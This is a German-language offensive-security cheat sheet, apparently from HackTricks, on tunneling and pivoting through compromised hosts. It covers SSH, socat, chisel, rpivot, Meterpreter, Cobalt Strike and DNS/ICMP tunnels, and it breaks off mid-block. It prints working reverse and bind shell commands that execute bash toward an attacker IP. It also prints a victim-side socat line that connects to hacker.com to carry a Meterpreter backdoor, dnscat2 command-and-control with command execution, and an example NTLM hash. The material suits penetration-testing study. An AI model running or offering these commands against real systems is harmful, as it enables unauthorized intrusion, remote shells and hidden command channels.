# Tunneling und Port Forwarding

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

## Nmap-Tipp

{% hint style="warning" %}
**ICMP**- und **SYN**-Scans können nicht über Socks-Proxies getunnelt werden. Daher müssen wir die Ping-Erkennung deaktivieren (`-Pn`) und **TCP-Scans** (`-sT`) angeben, damit dies funktioniert.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafische Verbindung (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Lokaler Port-zu-Port

Öffnen Sie einen neuen Port im SSH-Server --> Anderer Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokaler Port --> Kompromittierter Host (SSH) --> Dritte\_Box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokaler Port --> Kompromittierter Host (SSH) --> Überall
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Portweiterleitung

Dies ist nützlich, um Reverse Shells von internen Hosts über eine DMZ zu Ihrem Host zu erhalten:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Sie benötigen **Root-Zugriff auf beiden Geräten** (da Sie neue Schnittstellen erstellen werden) und die sshd-Konfiguration muss den Root-Login zulassen:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Aktivieren Sie die Weiterleitung auf der Serverseite.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Setzen Sie eine neue Route auf der Client-Seite.
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Sie können den gesamten Datenverkehr zu einem Teilnetzwerk über einen Host über SSH tunneln.\
Zum Beispiel, indem Sie den gesamten Datenverkehr weiterleiten, der zu 10.10.10.0/24 geht.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Verbindung mit einem privaten Schlüssel herstellen
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Sitzung) --> Dritte\_Box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS (Socket Secure) ist ein Protokoll, das verwendet wird, um Netzwerkverbindungen über einen Proxy-Server herzustellen. Es ermöglicht die Umleitung des Datenverkehrs über einen anderen Computer oder ein anderes Netzwerk, um die Identität und den Standort des Benutzers zu verschleiern. SOCKS kann verwendet werden, um den Datenverkehr von Anwendungen wie Webbrowsern, E-Mail-Clients und anderen Netzwerkanwendungen zu tunneln. Es bietet auch die Möglichkeit, den Datenverkehr über verschiedene Protokolle wie TCP und UDP zu tunneln. SOCKS kann auf verschiedenen Ebenen des Netzwerkstapels arbeiten und ist in der Regel mit Proxyservern kompatibel. Es ist ein nützliches Werkzeug für Hacker, um ihre Spuren zu verwischen und auf Ressourcen zuzugreifen, auf die sie normalerweise keinen Zugriff haben.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Eine andere Möglichkeit:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS-Proxy

Öffnen Sie einen Port im Teamserver, der auf allen Schnittstellen lauscht und verwendet werden kann, um den Datenverkehr durch den Beacon zu **leiten**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team Server, und der Datenverkehr wird zum Team Server und von dort zum angegebenen Host:Port gesendet.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Zu beachten:

- Beacon's Reverse Port Forwarding ist darauf ausgelegt, den Datenverkehr zum Team Server zu tunneln und nicht zwischen einzelnen Maschinen zu relayen.
- Der Datenverkehr wird innerhalb des Beacon's C2-Datenverkehrs getunnelt, einschließlich P2P-Verbindungen.
- Es sind keine Administratorrechte erforderlich, um Reverse Port Forwards auf hohen Ports zu erstellen.

### Lokaler rPort2Port

{% hint style="warning" %}
In diesem Fall wird der Port im Beacon-Host geöffnet, nicht im Team Server, und der Datenverkehr wird an den Cobalt Strike-Client (nicht an den Team Server) gesendet und von dort aus an den angegebenen Host:Port.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Sie müssen einen Webdatei-Tunnel hochladen: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Sie können es von der Releases-Seite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen.\
Sie müssen die **gleiche Version für Client und Server verwenden**

### Socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Portweiterleitung

Portweiterleitung ist eine Technik, mit der Netzwerkverbindungen von einem bestimmten Port auf einem Host zu einem anderen Port auf einem anderen Host weitergeleitet werden können. Dies ermöglicht es, den Datenverkehr zwischen verschiedenen Netzwerken oder Geräten umzuleiten.

#### Lokale Portweiterleitung

Die lokale Portweiterleitung wird verwendet, um den Datenverkehr von einem lokalen Port auf einem Host zu einem anderen Port auf demselben Host weiterzuleiten. Dies kann nützlich sein, um den Zugriff auf bestimmte Dienste oder Anwendungen zu ermöglichen, die auf einem anderen Port laufen.

Um eine lokale Portweiterleitung einzurichten, können Tools wie `netcat` oder `socat` verwendet werden. Diese Tools ermöglichen es, den Datenverkehr von einem Port auf einen anderen Port umzuleiten.

Beispiel für die Verwendung von `netcat` zur Einrichtung einer lokalen Portweiterleitung:

```bash
$ nc -l -p <local_port> -c 'nc <destination_host> <destination_port>'
```

#### Remote Portweiterleitung

Die Remote Portweiterleitung wird verwendet, um den Datenverkehr von einem entfernten Host zu einem anderen Host weiterzuleiten. Dies kann nützlich sein, um den Zugriff auf Dienste oder Anwendungen zu ermöglichen, die auf einem entfernten Host laufen.

Um eine Remote Portweiterleitung einzurichten, können Tools wie `ssh` verwendet werden. Mit `ssh` können Sie eine sichere Verbindung zu einem entfernten Host herstellen und den Datenverkehr von einem Port auf einen anderen Port weiterleiten.

Beispiel für die Verwendung von `ssh` zur Einrichtung einer Remote Portweiterleitung:

```bash
$ ssh -L <local_port>:<destination_host>:<destination_port> <remote_host>
```

#### Dynamische Portweiterleitung

Die dynamische Portweiterleitung ermöglicht es, den gesamten Datenverkehr über einen bestimmten Port auf einen entfernten Host weiterzuleiten. Dies kann nützlich sein, um den gesamten Internetverkehr über einen entfernten Host zu leiten und die eigene IP-Adresse zu verbergen.

Um eine dynamische Portweiterleitung einzurichten, können Tools wie `ssh` verwendet werden. Mit `ssh` können Sie eine Verbindung zu einem entfernten Host herstellen und den Datenverkehr über einen bestimmten Port weiterleiten.

Beispiel für die Verwendung von `ssh` zur Einrichtung einer dynamischen Portweiterleitung:

```bash
$ ssh -D <local_port> <remote_host>
```

#### Verwendung von Tunneling und Portweiterleitung in der Praxis

Tunneling und Portweiterleitung sind nützliche Techniken beim Hacking und Penetration Testing. Sie ermöglichen es, den Datenverkehr umzuleiten und auf entfernte Dienste oder Anwendungen zuzugreifen, die normalerweise nicht zugänglich wären.

Einige praktische Anwendungen von Tunneling und Portweiterleitung sind:

- Umgehung von Firewalls oder Netzwerkbeschränkungen, um auf blockierte Dienste zuzugreifen.
- Zugriff auf interne Netzwerke oder Geräte von außen.
- Verbergen der eigenen IP-Adresse und Anonymisierung des Internetverkehrs.
- Umleitung des Datenverkehrs für Man-in-the-Middle-Angriffe oder Netzwerküberwachung.

Es ist wichtig, diese Techniken verantwortungsbewusst und ethisch zu verwenden. Unautorisierte Nutzung von Tunneling und Portweiterleitung kann rechtliche Konsequenzen haben und als illegale Aktivität betrachtet werden.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse-Tunnel. Der Tunnel wird vom Opfer gestartet.\
Ein Socks4-Proxy wird auf 127.0.0.1:1080 erstellt.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivotieren über **NTLM-Proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind-Shell

Eine Bind-Shell ist ein Mechanismus, der es einem Angreifer ermöglicht, eine Verbindung zu einem bestimmten Port auf dem Zielrechner herzustellen und eine Shell-Sitzung zu starten. Socat ist ein vielseitiges Tool, das verwendet werden kann, um eine Bind-Shell einzurichten.

Um eine Bind-Shell mit Socat einzurichten, müssen Sie den folgenden Befehl ausführen:

```
socat TCP-LISTEN:<Port>,fork EXEC:/bin/bash
```

Ersetzen Sie `<Port>` durch den gewünschten Port, auf dem die Bind-Shell lauschen soll. Sobald der Befehl ausgeführt wird, wird Socat den angegebenen Port überwachen und eine Shell-Sitzung starten, wenn eine Verbindung hergestellt wird.

Sie können dann eine Verbindung zur Bind-Shell herstellen, indem Sie den folgenden Befehl ausführen:

```
socat TCP:<Ziel-IP>:<Port>
```

Ersetzen Sie `<Ziel-IP>` durch die IP-Adresse des Zielrechners und `<Port>` durch den Port, auf dem die Bind-Shell lauscht. Sobald die Verbindung hergestellt ist, haben Sie Zugriff auf die Shell des Zielrechners.

Es ist wichtig zu beachten, dass die Verwendung von Bind-Shells für illegale Aktivitäten illegal ist und nur zu Bildungszwecken oder mit ausdrücklicher Zustimmung des Eigentümers des Zielrechners verwendet werden sollte.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse Shell

Ein Reverse Shell ist eine Technik, bei der ein Angreifer eine Verbindung zu einem verwundbaren System herstellt und eine Shell-Sitzung auf diesem System öffnet. Im Gegensatz zu einer normalen Shell-Sitzung, bei der der Benutzer eine Verbindung zu einem entfernten System herstellt, ermöglicht ein Reverse Shell dem Angreifer, eine Verbindung von einem entfernten System zu seinem eigenen System herzustellen.

Diese Technik wird häufig verwendet, um Firewalls und andere Sicherheitsmaßnahmen zu umgehen, da die Verbindung von innen nach außen initiiert wird und normalerweise nicht von den Sicherheitsrichtlinien blockiert wird.

Ein Reverse Shell kann auf verschiedene Arten implementiert werden, einschließlich der Verwendung von Tools wie Netcat, Socat oder Metasploit. Sobald die Verbindung hergestellt ist, kann der Angreifer Befehle auf dem verwundbaren System ausführen und auf Dateien und Ressourcen zugreifen.

Es ist wichtig zu beachten, dass Reverse Shells eine illegale Aktivität darstellen, wenn sie ohne Zustimmung des Eigentümers des Systems verwendet werden. Reverse Shells sollten nur zu legitimen Zwecken im Rahmen von Penetrationstests oder anderen autorisierten Aktivitäten eingesetzt werden.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

Port2Port is a technique used to establish a direct connection between two network ports. This technique is commonly used in situations where direct communication between two hosts is not possible due to network restrictions or firewalls.

To establish a Port2Port connection, a tunneling method is used. This involves creating a tunnel between the source and destination ports, allowing data to be transmitted between them.

There are several tools and protocols that can be used for Port2Port tunneling, including SSH, VPNs, and proxy servers. These tools allow for the encapsulation of network traffic and the redirection of data between the source and destination ports.

Port2Port tunneling can be useful in various scenarios, such as bypassing network restrictions, accessing services on remote networks, and securing communication between hosts.

It is important to note that Port2Port tunneling should only be used for legitimate purposes and with proper authorization. Unauthorized use of this technique can lead to security breaches and legal consequences.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port über Socks

Port2Port ist eine Methode, um eine Verbindung zwischen zwei Ports herzustellen, indem ein Socks-Proxy verwendet wird. Dies ermöglicht es uns, den Datenverkehr von einem Port auf einen anderen umzuleiten.

Um Port2Port über Socks durchzuführen, müssen wir zunächst einen Socks-Proxy-Server einrichten. Dies kann entweder auf einem lokalen System oder auf einem entfernten Server erfolgen.

Sobald der Socks-Proxy-Server eingerichtet ist, können wir den Port2Port-Tunnel einrichten. Dazu verwenden wir ein Tool wie `socat` oder `netcat`, um eine Verbindung zwischen den beiden gewünschten Ports herzustellen.

Hier ist ein Beispiel, wie man Port2Port über Socks mit `socat` einrichtet:

```bash
socat TCP-LISTEN:<local_port>,fork SOCKS4A:<socks_proxy_ip>:<remote_host>:<remote_port>
```

Ersetzen Sie `<local_port>` durch den lokalen Port, auf dem Sie den Datenverkehr empfangen möchten, `<socks_proxy_ip>` durch die IP-Adresse des Socks-Proxy-Servers und `<remote_host>` und `<remote_port>` durch die IP-Adresse und den Port des Zielhosts.

Sobald der Port2Port-Tunnel eingerichtet ist, wird der Datenverkehr von `<local_port>` über den Socks-Proxy an `<remote_host>:<remote_port>` weitergeleitet.

Dies ist eine nützliche Technik, um den Datenverkehr über eine sichere Verbindung zu leiten und bestimmte Einschränkungen oder Firewalls zu umgehen. Es ist jedoch wichtig, diese Methode nur in legalen und autorisierten Szenarien anzuwenden.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter über SSL Socat

Eine Möglichkeit, eine Meterpreter-Sitzung über SSL zu tunneln, besteht darin, das Tool Socat zu verwenden. Socat ist ein vielseitiges Netzwerk-Tool, das verschiedene Arten von Verbindungen herstellen kann, einschließlich SSL-Verbindungen.

Um Meterpreter über SSL Socat zu tunneln, müssen Sie zunächst ein SSL-Zertifikat erstellen. Dies kann mit dem Befehl `openssl` erfolgen. Anschließend müssen Sie Socat installieren, wenn es noch nicht installiert ist.

Sobald Sie das SSL-Zertifikat erstellt und Socat installiert haben, können Sie den folgenden Befehl verwenden, um die Meterpreter-Sitzung zu tunneln:

```
socat OPENSSL-LISTEN:<local_port>,cert=<path_to_ssl_cert>,verify=0,fork TCP:<target_ip>:<target_port>
```

Ersetzen Sie `<local_port>` durch den lokalen Port, auf dem Sie die Verbindung empfangen möchten, `<path_to_ssl_cert>` durch den Pfad zu Ihrem SSL-Zertifikat, `<target_ip>` durch die IP-Adresse des Zielhosts und `<target_port>` durch den Port, auf dem der Meterpreter-Handler läuft.

Nachdem Sie den Befehl ausgeführt haben, können Sie eine Verbindung zu Ihrem lokalen Port herstellen, um auf die Meterpreter-Sitzung zuzugreifen, die über SSL tunnelt.

Dieser Ansatz ermöglicht es Ihnen, den Datenverkehr zu verschlüsseln und so die Erkennung durch Sicherheitsmaßnahmen zu erschweren. Es ist jedoch wichtig zu beachten, dass diese Methode nicht vor allen Arten von Überwachung schützt und dass zusätzliche Sicherheitsmaßnahmen erforderlich sein können, um die Anonymität und Sicherheit Ihrer Aktivitäten zu gewährleisten.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Sie können einen **nicht authentifizierten Proxy** umgehen, indem Sie diese Zeile anstelle der letzten in der Konsole des Opfers ausführen:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/rückwärts-ssl-backdoor-mit-socat-und-metasploit/](https://funoverip.net/2011/01/rückwärts-ssl-backdoor-mit-socat-und-metasploit/)

### SSL Socat Tunnel

**/bin/sh Konsole**

Erstellen Sie Zertifikate auf beiden Seiten: Client und Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbinden Sie den lokalen SSH-Port (22) mit dem Port 443 des Angreifer-Hosts.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es ist wie eine Konsolenversion von PuTTY (die Optionen sind sehr ähnlich zu einem ssh-Client).

Da diese ausführbare Datei auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Anschließend leiten wir nur lokal zugängliche Ports auf einen Port auf unserer Maschine weiter:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Sie müssen ein lokaler Administrator sein (für jeden Port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sie müssen **RDP-Zugriff auf das System** haben.\
Herunterladen:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) aus der Remote Desktop Service-Funktion von Windows. DVC ist für das **Tunneln von Paketen über die RDP-Verbindung** verantwortlich.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Laden Sie auf Ihrem Client-Computer **`SocksOverRDP-Plugin.dll`** wie folgt:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Jetzt können wir uns über RDP mit dem Opfer verbinden, indem wir `mstsc.exe` verwenden, und wir sollten eine Meldung erhalten, dass das SocksOverRDP-Plugin aktiviert ist und auf 127.0.0.1:1080 lauscht.

Verbinden Sie sich über RDP und laden Sie die `SocksOverRDP-Server.exe`-Datei auf die Opfermaschine hoch und führen Sie sie aus:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Jetzt bestätigen Sie auf Ihrem Rechner (Angreifer), dass der Port 1080 lauscht:
```
netstat -antb | findstr 1080
```
Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) verwenden, **um den Datenverkehr durch diesen Port zu tunneln**.

## Windows-GUI-Apps mit Proxifier tunneln

Sie können Windows-GUI-Apps mit [**Proxifier**](https://www.proxifier.com/) über einen Proxy navigieren lassen.\
In **Profil -> Proxy-Server** fügen Sie die IP und den Port des SOCKS-Servers hinzu.\
In **Profil -> Proxifizierungsregeln** fügen Sie den Namen des zu proxifizierenden Programms und die Verbindungen zu den IPs hinzu, die Sie proxifizieren möchten.

## NTLM-Proxy-Umgehung

Das zuvor erwähnte Tool: **Rpivot**\
Auch **OpenVPN** kann es umgehen, indem Sie diese Optionen in der Konfigurationsdatei festlegen:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Es authentifiziert sich gegen einen Proxy und bindet einen lokalen Port, der an den von Ihnen angegebenen externen Dienst weitergeleitet wird. Anschließend können Sie das Tool Ihrer Wahl über diesen Port verwenden.\
Zum Beispiel wird der Port 443 weitergeleitet.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Nun, wenn Sie zum Beispiel den **SSH**-Dienst beim Opfer so einstellen, dass er auf Port 443 lauscht, können Sie über den Angreifer-Port 2222 eine Verbindung dazu herstellen.\
Sie könnten auch einen **Meterpreter** verwenden, der sich mit localhost:443 verbindet, während der Angreifer auf Port 2222 lauscht.

## YARP

Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden ihn hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS-Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

In beiden Systemen ist Root-Zugriff erforderlich, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von DNS-Anfragen zu tunneln.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Der Tunnel wird sehr langsam sein. Sie können eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem Sie Folgendes verwenden:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laden Sie es hier herunter**](https://github.com/iagox86/dnscat2)**.**

Richtet einen C\&C-Kanal über DNS ein. Es benötigt keine Root-Rechte.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Sie können [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) verwenden, um einen dnscat2-Client in PowerShell auszuführen:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Portweiterleitung mit dnscat**

Portweiterleitung ist eine Technik, bei der der Datenverkehr von einem bestimmten Port auf einen anderen Port umgeleitet wird. Dies kann nützlich sein, um den Zugriff auf bestimmte Dienste oder Anwendungen zu ermöglichen, die normalerweise nicht von außen erreichbar sind.

Dnscat ist ein Werkzeug, das DNS-Anfragen verwendet, um Daten zu übertragen. Es kann auch für die Portweiterleitung verwendet werden, indem es den Datenverkehr von einem bestimmten Port auf einen DNS-Server umleitet.

Um dnscat für die Portweiterleitung zu verwenden, müssen Sie zuerst einen DNS-Server einrichten, der die Anfragen empfangen und den Datenverkehr an den gewünschten Port weiterleiten kann. Sie können dnscat auf dem Zielserver installieren und den DNS-Server so konfigurieren, dass er die Anfragen an den gewünschten Port weiterleitet.

Sobald der DNS-Server eingerichtet ist, können Sie dnscat verwenden, um den Datenverkehr von einem bestimmten Port auf den DNS-Server umzuleiten. Dies ermöglicht es Ihnen, auf Dienste oder Anwendungen zuzugreifen, die normalerweise nicht von außen erreichbar sind.

Die Verwendung von dnscat für die Portweiterleitung kann jedoch Sicherheitsrisiken mit sich bringen, da DNS-Anfragen normalerweise nicht verschlüsselt sind und von Angreifern abgefangen oder manipuliert werden können. Es ist daher wichtig, geeignete Sicherheitsmaßnahmen zu ergreifen, um den Datenverkehr zu schützen.

Insgesamt ist die Portweiterleitung mit dnscat eine nützliche Technik, um auf Dienste oder Anwendungen zuzugreifen, die normalerweise nicht von außen erreichbar sind. Es ist jedoch wichtig, die Sicherheitsrisiken zu verstehen und angemessene Schutzmaßnahmen zu ergreifen.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Proxychains DNS ändern

Proxychains fängt den `gethostbyname`-Aufruf der libc ab und leitet die TCP-DNS-Anfrage über den Socks-Proxy um. Standardmäßig verwendet Proxychains den DNS-Server **4.2.2.2** (fest codiert). Um ihn zu ändern, bearbeiten Sie die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändern Sie die IP. Wenn Sie sich in einer **Windows-Umgebung** befinden, können Sie die IP des **Domänencontrollers** festlegen.

## Tunnel in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP-Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

In beiden Systemen ist Root-Zugriff erforderlich, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laden Sie es hier herunter**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
